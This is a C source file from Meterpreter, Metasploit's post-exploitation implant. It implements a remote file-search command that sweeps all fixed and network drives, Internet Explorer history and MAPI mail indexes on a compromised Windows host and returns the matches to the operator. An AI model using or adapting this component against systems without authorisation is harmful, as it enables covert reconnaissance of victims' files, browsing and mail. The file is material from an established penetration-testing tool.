/*
 * Meterpreter support for searching the file system on Windows for a file pattern.
 * Supports Windows NT4 up to and including Windows 7. When available it will
 * leverage the local index via Windows Desktop Search (WDS) to speed up the search
 * process. WDS version 2 is supported for older systems (Windows 2000/XP/2003),
 * and version 3 is supported for newer systems (Vista and above by default, Windows
 * XP/2003 with an addon). When a directory is not indexed the fallback search
 * technique uses FindFirstFile/FindNextFile.
 *
 * sf - August 2010
 */

#include "precomp.h"
#include "fs.h"
#include "fs_local.h"
#include "search.h"

/*
 * Helper function to add a search result to the response packet.
 */
VOID search_add_result(Packet * pResponse, wchar_t *directory, wchar_t *fileName, DWORD dwFileSize)
{
	char *dir = wchar_to_utf8(directory);
	char *file = wchar_to_utf8(fileName);

	dprintf("[SEARCH] Found: %s\\%s", dir, file);

	if (dir && file) {
		Packet* group = packet_create_group();

		packet_add_tlv_string(group, TLV_TYPE_FILE_PATH, dir);
		packet_add_tlv_string(group, TLV_TYPE_FILE_NAME, file);
		packet_add_tlv_uint(group, TLV_TYPE_FILE_SIZE, dwFileSize);

		packet_add_group(pResponse, TLV_TYPE_SEARCH_RESULTS, group);
	}

	free(dir);
	free(file);
}

/*
 * Helper function to initilize the Windows Desktop Search v2 and v3 interfaces (if available).
 */
VOID wds_startup(WDS_INTERFACE * pWDSInterface)
{
	DWORD dwResult = ERROR_SUCCESS;
	HRESULT hr     = 0;

	do
	{
		memset(pWDSInterface, 0, sizeof(WDS_INTERFACE));

		hr = CoInitialize(NULL);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds_startup: CoInitializeEx Failed", hr);
		}

		do
		{
			pWDSInterface->hQuery = LoadLibraryA("query.dll");
			if (!pWDSInterface->hQuery) {
				BREAK_ON_ERROR("[SEARCH] wds_startup:v2: LoadLibraryA query.dll Failed");
			}

			pWDSInterface->pLocateCatalogsW = (LOCATECATALOGSW)GetProcAddress(pWDSInterface->hQuery, "LocateCatalogsW");
			if (!pWDSInterface->pLocateCatalogsW) {
				BREAK_ON_ERROR("[SEARCH] wds_startup:v2: GetProcAddress LocateCatalogsW Failed");
			}

			pWDSInterface->pCIMakeICommand = (CIMAKEICOMMAND)GetProcAddress(pWDSInterface->hQuery, "CIMakeICommand");
			if (!pWDSInterface->pCIMakeICommand) {
				BREAK_ON_ERROR("[SEARCH] wds_startup:v2: GetProcAddress CIMakeICommand Failed");
			}

			pWDSInterface->pCITextToFullTree = (CITEXTTOFULLTREE)GetProcAddress(pWDSInterface->hQuery, "CITextToFullTree");
			if (!pWDSInterface->pCITextToFullTree) {
				BREAK_ON_ERROR("[SEARCH] wds_startup:v2: GetProcAddress CITextToFullTree Failed");
			}

			pWDSInterface->bWDS2Available = TRUE;

		} while (0);

		do
		{
			hr = CoCreateInstance(&_CLSID_CSearchManager, NULL, CLSCTX_ALL, &_IID_ISearchManager, (LPVOID *)&pWDSInterface->pSearchManager);
			if (FAILED(hr)) {
				BREAK_WITH_ERROR("[SEARCH] wds_startup:v3: CoCreateInstance _IID_ISearchManager Failed", hr);
			}

			hr = ISearchManager_GetCatalog(pWDSInterface->pSearchManager, L"SystemIndex", &pWDSInterface->pSearchCatalogManager);
			if (FAILED(hr)) {
				BREAK_WITH_ERROR("[SEARCH] wds_startup:v3: ISearchManager_GetCatalog Failed", hr);
			}

			hr = ISearchCatalogManager_GetCrawlScopeManager(pWDSInterface->pSearchCatalogManager, &pWDSInterface->pCrawlScopeManager);
			if (FAILED(hr)) {
				BREAK_WITH_ERROR("[SEARCH] wds_startup:v3: ISearchCatalogManager_GetCrawlScopeManager Failed", hr);
			}

			pWDSInterface->bWDS3Available = TRUE;

		} while (0);

	} while (0);
}

/*
 * Helper function to cleanup the Windows Desktop Search v2 and v3 interfaces.
 */
VOID wds_shutdown(WDS_INTERFACE * pWDSInterface)
{
	do
	{
		if (!pWDSInterface)
		{
			break;
		}

		if (pWDSInterface->hQuery)
		{
			FreeLibrary(pWDSInterface->hQuery);
		}

		pWDSInterface->pLocateCatalogsW  = NULL;
		pWDSInterface->pCIMakeICommand   = NULL;
		pWDSInterface->pCITextToFullTree = NULL;

		pWDSInterface->bWDS2Available    = FALSE;

		if (pWDSInterface->pCrawlScopeManager)
		{
			ISearchCrawlScopeManager_Release(pWDSInterface->pCrawlScopeManager);
			pWDSInterface->pCrawlScopeManager = NULL;
		}

		if (pWDSInterface->pSearchCatalogManager)
		{
			ISearchCatalogManager_Release(pWDSInterface->pSearchCatalogManager);
			pWDSInterface->pSearchCatalogManager = NULL;
		}

		if (pWDSInterface->pSearchManager)
		{
			ISearchManager_Release(pWDSInterface->pSearchManager);
			pWDSInterface->pSearchManager = NULL;
		}

		pWDSInterface->bWDS3Available = FALSE;

		CoUninitialize();

	} while (0);
}

/*
 * Helper function to check if a given directory is indexed in the WDS v2 system catalog on the local machine.
 */
BOOL wds2_indexed(WDS_INTERFACE * pWDSInterface, wchar_t * directory)
{
	wchar_t machine[MAX_COMPUTERNAME_LENGTH + 1] = {0};
	wchar_t catalog[MAX_PATH + 1]                = {0};
	DWORD machineLength                          = MAX_COMPUTERNAME_LENGTH + 1;
	DWORD catalogLength                          = MAX_PATH + 1 ;
	DWORD index                                  = 0;

	if (!pWDSInterface->bWDS2Available) {
		return FALSE;
	}

	while (pWDSInterface->pLocateCatalogsW(directory, index++, machine,
	    &machineLength, catalog, &catalogLength) == S_OK)
	{
		if (wcscmp(machine, L".") == 0 && _wcsicmp(catalog, L"system") == 0)
		{
			return TRUE;
		}
	}

	return FALSE;
}

/*
 * Helper function to check if a given directory is indexed in the WDS v3 crawl scope
 */
BOOL wds3_indexed(WDS_INTERFACE * pWDSInterface, wchar_t * directory)
{
	BOOL bResult = FALSE;

	if (pWDSInterface->bWDS3Available) {
		ISearchCrawlScopeManager_IncludedInCrawlScope(
		    pWDSInterface->pCrawlScopeManager, directory, &bResult);
	}

	return bResult;
}

/*
 * Helper function to execute a WDS v2 or v3 search via COM and process
 * any results (assumes rows have columns of 'size,path').
 */
HRESULT wds_execute(ICommand * pCommand, Packet * pResponse)
{
	IRowset * pRowset           = NULL;
	IAccessor * pAccessor       = NULL;
	size_t dwLength             = 0;
	HACCESSOR hAccessor         = 0;
	DBCOUNTITEM dbCount         = 0;
	DWORD dwResult              = 0;
	HRESULT hr                  = 0;
	DBBINDING dbBindings[2]     = {0};
	SEARCH_ROW rowSearchResults = {0};
	HROW hRow[1]                = {0};
	HROW * pRows                = &hRow[0];

	do
	{
		hr = ICommand_Execute(pCommand, NULL, &_IID_IRowset, NULL, NULL, (IUnknown**)&pRowset);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds_execute: ICommand_Execute Failed", hr);
		}

		hr = IRowset_QueryInterface(pRowset, &_IID_IAccessor, (LPVOID *)&pAccessor);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds_execute: IRowset_QueryInterface _IID_IAccessor Failed", hr);
		}

		memset(&dbBindings, 0, sizeof(DBBINDING)*2);

		dbBindings[0].iOrdinal   = 1;
		dbBindings[0].dwPart     = DBPART_STATUS | DBPART_LENGTH | DBPART_VALUE;
		dbBindings[0].dwMemOwner = DBMEMOWNER_CLIENTOWNED;
		dbBindings[0].cbMaxLen   = sizeof(DWORD);
		dbBindings[0].dwFlags    = 0;
		dbBindings[0].eParamIO   = DBPARAMIO_NOTPARAM;
		dbBindings[0].wType      = DBTYPE_I4;
		dbBindings[0].obStatus   = offsetof(SEARCH_ROW, dbSizeStatus);
		dbBindings[0].obLength   = offsetof(SEARCH_ROW, dwSizeLength);
		dbBindings[0].obValue    = offsetof(SEARCH_ROW, dwSizeValue);

		dbBindings[1].iOrdinal   = 2;
		dbBindings[1].dwPart     = DBPART_STATUS | DBPART_LENGTH | DBPART_VALUE;
		dbBindings[1].dwMemOwner = DBMEMOWNER_CLIENTOWNED;
		dbBindings[1].cbMaxLen   = MAX_PATH;
		dbBindings[1].dwFlags    = 0;
		dbBindings[1].eParamIO   = DBPARAMIO_NOTPARAM;
		dbBindings[1].wType      = DBTYPE_WSTR;
		dbBindings[1].obStatus   = offsetof(SEARCH_ROW, dbPathStatus);
		dbBindings[1].obLength   = offsetof(SEARCH_ROW, dwPathLength);
		dbBindings[1].obValue    = offsetof(SEARCH_ROW, wPathValue);

		hr = IAccessor_CreateAccessor(pAccessor, DBACCESSOR_ROWDATA, 2, (DBBINDING *)&dbBindings, 0, &hAccessor, NULL);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds_execute: IAccessor_CreateAccessor Failed", hr);
		}

		while (TRUE)
		{
			memset(&rowSearchResults, 0, sizeof(SEARCH_ROW));

			hr = IRowset_GetNextRows(pRowset, DB_NULL_HCHAPTER, 0, 1, &dbCount, (HROW **)&pRows);
			if (FAILED(hr)) {
				BREAK_WITH_ERROR("[SEARCH] wds_execute: IRowset_GetNextRows Failed", hr);
			}

			if (!dbCount) {
				BREAK_WITH_ERROR("[SEARCH] wds_execute: No more rows to get.", ERROR_SUCCESS);
			}

			hr = IRowset_GetData(pRowset, hRow[0], hAccessor, &rowSearchResults);
			if (FAILED(hr)) {
				BREAK_WITH_ERROR("[SEARCH] wds_execute: IRowset_GetData Failed", hr);
			}

			if (_memicmp(L"iehistory:", rowSearchResults.wPathValue, sizeof(L"iehistory:")) == 0)
			{
				// "iehistory://{*}/"
				wchar_t * history = wcsstr(rowSearchResults.wPathValue, L"}");
				if (history) {
					search_add_result(pResponse, L"", history + 2, 0);
				}
			}
			else if (_memicmp(L"mapi:", rowSearchResults.wPathValue, sizeof(L"mapi:")) == 0)
			{
				// "mapi://{*}/"
				wchar_t * history = wcsstr(rowSearchResults.wPathValue, L"}");
				if (history) {
					search_add_result(pResponse, L"", history + 2, 0);
				}
			}
			else if (rowSearchResults.dwSizeValue > 0) {

				size_t i            = 0;
				wchar_t * fileName  = L"";
				wchar_t * file      = L"";
				wchar_t * directory = rowSearchResults.wPathValue;

				if (_memicmp(L"file:", directory, wcslen(L"file:")) == 0) {
					directory = (directory + wcslen(L"file:"));
				}

				for (i = 0; i < wcslen(directory); i++)
				{
					if (directory[i] == L'/') {
						directory[i] = L'\\';
					}
				}

				file = wcsrchr(directory, L'\\');
				if (file)
				{
					*file    = L'\x00';
					fileName = file + 1;
				}
				else
				{
					directory = L"";
					fileName  = directory;
				}

				search_add_result(pResponse, directory, fileName, rowSearchResults.dwSizeValue);
			}

			hr = IRowset_ReleaseRows(pRowset, dbCount, pRows, NULL, NULL, NULL);
			if (FAILED(hr)) {
				BREAK_WITH_ERROR("[SEARCH] wds_execute: IRowset_ReleaseRows Failed", hr);
			}
		}

	} while (0);

	if (pAccessor)
	{
		IAccessor_ReleaseAccessor(pAccessor, hAccessor, NULL);
		IAccessor_Release(pAccessor);
	}

	if (pRowset) {
		IRowset_Release(pRowset);
	}

	return dwResult;
}

/*
 * Search via Windows Desktop Search v2 via COM
 */
DWORD wds2_search(WDS_INTERFACE * pWDSInterface, wchar_t *directory, SEARCH_OPTIONS * pOptions, Packet * pResponse)
{
	DWORD dwResult              = ERROR_SUCCESS;
	ICommand * pCommand         = NULL;
	DBCOMMANDTREE * pTree       = NULL;
	ICommandTree * pCommandTree = NULL;
	wchar_t * query               = NULL;
	wchar_t * newCurrent          = NULL;
	DWORD dwDepth[1]            = {0};
	wchar_t * wcScope[1]          = {0};
	wchar_t * wcCatalog[1]        = {0};
	wchar_t * wcMachines[1]       = {0};
	HRESULT hr                  = 0;
	size_t dwLength             = 0;


	dprintf("[SEARCH] wds2_search: Starting...");

	do
	{
		if (!pWDSInterface) {
			BREAK_WITH_ERROR("[SEARCH] wds2_search: !pWDSInterface", ERROR_INVALID_PARAMETER);
		}

		if (!pWDSInterface->bWDS2Available) {
			break;
		}

		if (!pResponse || !pOptions) {
			BREAK_WITH_ERROR("[SEARCH] wds2_search: !pResultList || !pOptions", ERROR_INVALID_PARAMETER);
		}

		if (!directory) {
			directory = pOptions->rootDirectory;
		}

		// sf: WDS v2 can bawk if a trailing slash is not present on some paths :/
		dwLength = wcslen(directory);
		if (directory[dwLength-1] != L'\\')
		{
			newCurrent = calloc(dwLength + 2, sizeof(wchar_t));
			if (!newCurrent) {
				BREAK_WITH_ERROR("[SEARCH] wds2_search: !newCurrent", ERROR_OUTOFMEMORY);
			}

			swprintf(newCurrent, dwLength + 2, L"%s\\", directory);

			directory = newCurrent;
		}

		if (pOptions->bResursive) {
			dwDepth[0] = QUERY_DEEP | QUERY_PHYSICAL_PATH;
		}
		else {
			dwDepth[0] = QUERY_SHALLOW | QUERY_PHYSICAL_PATH;
		}

		wcScope[0]    = pOptions->rootDirectory;
		wcCatalog[0]  = L"System";
		wcMachines[0] = L".";

		hr = pWDSInterface->pCIMakeICommand((ICommand**)&pCommand, 1,
		    (DWORD *)&dwDepth, (wchar_t **)&wcScope, (wchar_t **)&wcCatalog,
			(wchar_t **)&wcMachines);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds2_search: CIMakeICommand Failed", hr);
		}

		hr = ICommand_QueryInterface(pCommand, &_IID_ICommandTree, (LPVOID *)&pCommandTree);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds2_search: ICommand_QueryInterface Failed", hr);
		}

		dwLength = wcslen(pOptions->glob);

		query = calloc((dwLength + 128), sizeof(wchar_t));
		if (!query) {
			BREAK_WITH_ERROR("[SEARCH] wds2_search: calloc wQuery failed", ERROR_INVALID_PARAMETER);
		}

		swprintf_s(query, (dwLength + 128), L"#filename = %s", pOptions->glob);

		hr = pWDSInterface->pCITextToFullTree(query, L"size,path", NULL, NULL, &pTree, 0, NULL, GetSystemDefaultLCID());
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds2_search: CITextToFullTree Failed", hr);
		}

		hr = ICommandTree_SetCommandTree(pCommandTree, &pTree, DBCOMMANDREUSE_NONE, FALSE);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds2_search: ICommandTree_SetCommandTree Failed", hr);
		}

		hr = wds_execute(pCommand, pResponse);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds2_search: wds_execute Failed", hr);
		}

	} while (0);

	if (pCommandTree) {
		ICommandTree_Release(pCommandTree);
	}

	if (pCommand) {
		ICommand_Release(pCommand);
	}

	free(query);
	free(newCurrent);

	dprintf("[SEARCH] wds2_search: Finished.");

	return dwResult;
}

/*
 * Search via Windows Desktop Search >= 3.0 via COM ...yuk! would a kernel32!FileSearch("*.doc") have killed them!?!?
 */
DWORD wds3_search(WDS_INTERFACE * pWDSInterface, wchar_t * wpProtocol, wchar_t * directory,
    SEARCH_OPTIONS * pOptions, Packet * pResponse)
{
	DWORD dwResult                    = ERROR_SUCCESS;
	wchar_t * wpSQL                   = NULL;
	wchar_t * wpConnectionString      = NULL;
	ISearchQueryHelper * pQueryHelper = NULL;
	IDataInitialize * pDataInitialize = NULL;
	IDBInitialize * pIDBInitialize    = NULL;
	IDBCreateSession * pSession       = NULL;
	IOpenRowset * pOpenRowset         = NULL;
	IDBCreateCommand * pCreateCommand = NULL;
	ICommand * pCommand               = NULL;
	ICommandText * pCommandText       = NULL;
	HRESULT hr                        = 0;
	size_t dwLength                   = 0;

	dprintf("[SEARCH] wds3_search: Starting...");

	do
	{
		if (!pWDSInterface) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: !pWDSInterface", ERROR_INVALID_PARAMETER);
		}

		if (!pWDSInterface->bWDS3Available) {
			break;
		}

		if (!pResponse || !pOptions || !wpProtocol) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: !pResultList || !pOptions || !wpProtocol", ERROR_INVALID_PARAMETER);
		}

		if (!directory) {
			directory = pOptions->rootDirectory;
		}

		hr = ISearchCatalogManager_GetQueryHelper(pWDSInterface->pSearchCatalogManager, &pQueryHelper);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: ISearchCatalogManager_GetQueryHelper Failed", hr);
		}

		hr = ISearchQueryHelper_put_QuerySelectColumns(pQueryHelper, L"size,path");
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: ISearchQueryHelper_put_QuerySelectColumns Failed", hr);
		}

		if (directory)
		{
			size_t len = wcslen(directory) + 128;
			wchar_t *where = calloc(len, sizeof(wchar_t));
			if (where) {
				if (pOptions->bResursive) {
					swprintf_s(where, len, L"AND SCOPE='%s:%s'", wpProtocol, directory);
				}
				else {
					swprintf_s(where, len, L"AND DIRECTORY='%s:%s'", wpProtocol, directory);
				}
				ISearchQueryHelper_put_QueryWhereRestrictions(pQueryHelper, where);
				free(where);
			} else {
				dprintf("[SEARCH] wds3_search: !where", ERROR_OUTOFMEMORY);
			}
		}

		hr = ISearchQueryHelper_GenerateSQLFromUserQuery(pQueryHelper, pOptions->glob, &wpSQL);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: ISearchQueryHelper_GenerateSQLFromUserQuery Failed", hr);
		}

		hr = CoCreateInstance(&_CLSID_MSDAInitialize, NULL, CLSCTX_ALL, &_IID_IDataInitialize, (LPVOID *)&pDataInitialize);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: CoCreateInstance _IID_IDataInitialize Failed", hr);
		}

		hr = ISearchQueryHelper_get_ConnectionString(pQueryHelper, &wpConnectionString);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: ISearchQueryHelper_get_ConnectionString _IID_IDataInitialize Failed", hr);
		}

		hr = IDataInitialize_GetDataSource(pDataInitialize, NULL, CLSCTX_INPROC_SERVER, wpConnectionString, &_IID_IDBInitialize, (IUnknown**)&pIDBInitialize);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: IDataInitialize_GetDataSource Failed", hr);
		}

		hr = IDBInitialize_Initialize(pIDBInitialize);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: IDBInitialize_Initialize Failed", hr);
		}

		hr = IDBInitialize_QueryInterface(pIDBInitialize, &_IID_IDBCreateSession, (LPVOID *)&pSession);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: IDBInitialize_QueryInterface Failed", hr);
		}

		hr = IDBCreateSession_CreateSession(pSession, NULL, &_IID_IOpenRowset, (IUnknown**)&pOpenRowset);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: IDBCreateSession_CreateSession Failed", hr);
		}

		hr = IOpenRowset_QueryInterface(pOpenRowset, &_IID_IDBCreateCommand, (LPVOID *)&pCreateCommand);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: IOpenRowset_QueryInterface Failed", hr);
		}

		hr = IDBCreateCommand_CreateCommand(pCreateCommand, NULL, &_IID_ICommand, (IUnknown**)&pCommand);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: IDBCreateCommand_CreateCommand Failed", hr);
		}

		hr = ICommand_QueryInterface(pCommand, &_IID_ICommandText, (LPVOID *)&pCommandText);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: ICommand_QueryInterface Failed", hr);
		}

#ifdef DEBUGTRACE
		OutputDebugStringW(wpSQL);
#endif

		hr = ICommandText_SetCommandText(pCommandText, &DBGUID_DEFAULT, wpSQL);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: ICommandText_SetCommandText Failed", hr);
		}

		hr = wds_execute(pCommand, pResponse);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[SEARCH] wds3_search: wds_execute Failed", hr);
		}

	} while (0);

	dprintf("[SEARCH] wds3_search: Releasing COM objects...");

	if (pCommandText) {
		ICommandText_Release(pCommandText);
	}

	if (pCreateCommand) {
		IDBCreateCommand_Release(pCreateCommand);
	}

	if (pCommand) {
		ICommand_Release(pCommand);
	}

	if (pOpenRowset) {
		IOpenRowset_Release(pOpenRowset);
	}

	if (pSession) {
		IDBCreateSession_Release(pSession);
	}

	if (pQueryHelper) {
		ISearchQueryHelper_Release(pQueryHelper);
	}

	if (pIDBInitialize) {
		IDBInitialize_Release(pIDBInitialize);
	}

	if (pDataInitialize) {
		IDataInitialize_Release(pDataInitialize);
	}

	dprintf("[SEARCH] wds3_search: Finished.");

	return dwResult;
}

/*
 * Search a directory for files.
 */
DWORD search_files(wchar_t * directory, SEARCH_OPTIONS * pOptions, Packet * pResponse)
{
	wchar_t firstFile[FS_MAX_PATH];
	swprintf_s(firstFile, FS_MAX_PATH, L"%s\\%s", directory, pOptions->glob);

	WIN32_FIND_DATAW data;
	HANDLE hFile = FindFirstFileW(firstFile, &data);
	if (hFile != INVALID_HANDLE_VALUE) {
		do
		{
			if (wcscmp(data.cFileName, L".") && wcscmp(data.cFileName, L"..") &&
				!(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				search_add_result(pResponse, directory, data.cFileName, data.nFileSizeLow);
			}
		} while (FindNextFileW(hFile, &data) != 0);

		FindClose(hFile);
	} else {
		if (GetLastError() != ERROR_FILE_NOT_FOUND) {
			dprintf("[SEARCH] search_files: FindFirstFileW Failed.");
			return GetLastError();
		}
	}

	return ERROR_SUCCESS;
}

DWORD directory_search(wchar_t *directory, SEARCH_OPTIONS * pOptions, Packet * pResponse, int depth)
{
	DWORD dwResult            = ERROR_SUCCESS;
	BOOL bAllreadySearched    = FALSE;
	WIN32_FIND_DATAW FindData = {0};
	size_t len                = wcslen(directory) + 5;

	if (depth > 32 || len >= FS_MAX_PATH) {
		return ERROR_SUCCESS;
	}

	wchar_t *firstFile = calloc(len, sizeof(wchar_t));
	if (!firstFile) {
		return ERROR_SUCCESS;
	}
	swprintf_s(firstFile, FS_MAX_PATH, L"%s\\*.*", directory);

	HANDLE hFile = FindFirstFileW(firstFile, &FindData);
	dprintf("%S", directory);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if (pOptions->bResursive &&
					wcscmp(FindData.cFileName, L".") && wcscmp(FindData.cFileName, L".."))
				{

					size_t len = wcslen(directory) + wcslen(FindData.cFileName) + 32;
					wchar_t *nextDirectory = calloc(len, sizeof(wchar_t));
					if (nextDirectory) {
						swprintf_s(nextDirectory, len, L"%s\\%s", directory, FindData.cFileName);

						dwResult = directory_search(nextDirectory, pOptions, pResponse, depth + 1);

						free(nextDirectory);
					}
				}
			}
			else if (!bAllreadySearched)
			{
				// Call FindFirstFile again to glob specific files in this directory
				dwResult = search_files(directory, pOptions, pResponse);

				bAllreadySearched = TRUE;
			}
		} while (FindNextFileW(hFile, &FindData) != 0);

		FindClose(hFile);
	} else {
		if (GetLastError() != ERROR_FILE_NOT_FOUND) {
			dprintf("[SEARCH] search_files: FindFirstFileW Failed.");
			dwResult = GetLastError();
		}
	}

	free(firstFile);

	return dwResult;
}

/*
 * Perform a file search using Windows Desktop Search (v2 or v3 depending what's available)
 * and falling back to a FindFirstFile/FindNextFile search technique if not.
 */
DWORD search(WDS_INTERFACE * pWDSInterface, wchar_t *directory, SEARCH_OPTIONS * pOptions, Packet * pResponse)
{
	DWORD dwResult           = ERROR_ACCESS_DENIED;

	if (!directory)
		directory = pOptions->rootDirectory;

	if (!directory) {
		dwResult = ERROR_INVALID_PARAMETER;
	} else {
		if (wds3_indexed(pWDSInterface, directory)) {
			dwResult = wds3_search(pWDSInterface, L"file", directory, pOptions, pResponse);
		}

		if (dwResult != ERROR_SUCCESS && wds2_indexed(pWDSInterface, directory)) {
			dwResult = wds2_search(pWDSInterface, directory, pOptions, pResponse);
		}

		if (dwResult != ERROR_SUCCESS) {
			dwResult = directory_search(directory, pOptions, pResponse, 0);
		}
	}

	return dwResult;
}

VOID search_all_drives(WDS_INTERFACE *pWDSInterface, SEARCH_OPTIONS *options, Packet *pResponse)
{
	DWORD dwLogicalDrives = GetLogicalDrives();

	for (wchar_t index = L'a'; index <= L'z'; index++)
	{
		if (dwLogicalDrives & (1 << (index-L'a')))
		{
			DWORD dwType   = 0;
			wchar_t drive[3] = {0};

			swprintf_s(drive, 3, L"%c:", index);

			dwType = GetDriveTypeW(drive);

			if (dwType == DRIVE_FIXED || dwType == DRIVE_REMOTE)
			{
				options->rootDirectory = drive;

				dprintf("[SEARCH] request_fs_search. Searching drive %S (type=%d)...",
					options->rootDirectory, dwType);

				search(pWDSInterface, NULL, options, pResponse);
			}
		}
	}

	options->rootDirectory = NULL;
}

/*
 * Request routine for performing a file search.
 */
DWORD request_fs_search(Remote * pRemote, Packet * pPacket)
{
	DWORD dwResult              = ERROR_SUCCESS;
	Packet * pResponse          = NULL;
	SEARCH_OPTIONS options      = {0};
	WDS_INTERFACE WDSInterface  = {0};

	dprintf("[SEARCH] request_fs_search. Starting.");

	pResponse = packet_create_response(pPacket);
	if (!pResponse) {
		dprintf("[SEARCH] request_fs_search: pResponse == NULL");
		return ERROR_INVALID_HANDLE;
	}

	options.rootDirectory = utf8_to_wchar(
		packet_get_tlv_value_string(pPacket, TLV_TYPE_SEARCH_ROOT));

	options.glob = utf8_to_wchar(
		packet_get_tlv_value_string(pPacket, TLV_TYPE_SEARCH_GLOB));

	if (options.rootDirectory && wcslen(options.rootDirectory) == 0) {
		free(options.rootDirectory);
		options.rootDirectory = NULL;
	} else {
		for (size_t i = 0; i < wcslen(options.rootDirectory); i++) {
			if (options.rootDirectory[i] == L'/') {
				options.rootDirectory[i] = L'\\';
			}
		}

		wchar_t *end = options.rootDirectory + (wcslen(options.rootDirectory) - 1);
		if (*end == L'\\') {
			*end = L'\x00';
		}
	}

	dprintf("[SEARCH] root: '%S' glob: '%S'", options.rootDirectory, options.glob);

	options.bResursive = packet_get_tlv_value_bool(pPacket, TLV_TYPE_SEARCH_RECURSE);

	if (!options.glob) {
		options.glob = L"*.*";
	}

	wds_startup(&WDSInterface);

	if (!options.rootDirectory)
	{
		search_all_drives(&WDSInterface, &options, pResponse);
		wds3_search(&WDSInterface, L"iehistory", NULL, &options, pResponse);
		wds3_search(&WDSInterface, L"mapi", NULL, &options, pResponse);
	}
	else
	{
		if (wcscmp(options.rootDirectory, L"iehistory") == 0)
		{
			options.rootDirectory = L"";
			wds3_search(&WDSInterface, L"iehistory", NULL, &options, pResponse);
		}
		else if (wcscmp(options.rootDirectory, L"mapi") == 0)
		{
			options.rootDirectory = L"";
			wds3_search(&WDSInterface, L"mapi", NULL, &options, pResponse);
		}
		else
		{
			dwResult = search(&WDSInterface, NULL, &options, pResponse);
		}
	}

	if (pResponse)
	{
		dwResult = packet_transmit_response(dwResult, pRemote, pResponse);
	}

	wds_shutdown(&WDSInterface);

	dprintf("[SEARCH] request_fs_search: Finished. dwResult=0x%08X", dwResult);

	return dwResult;
}
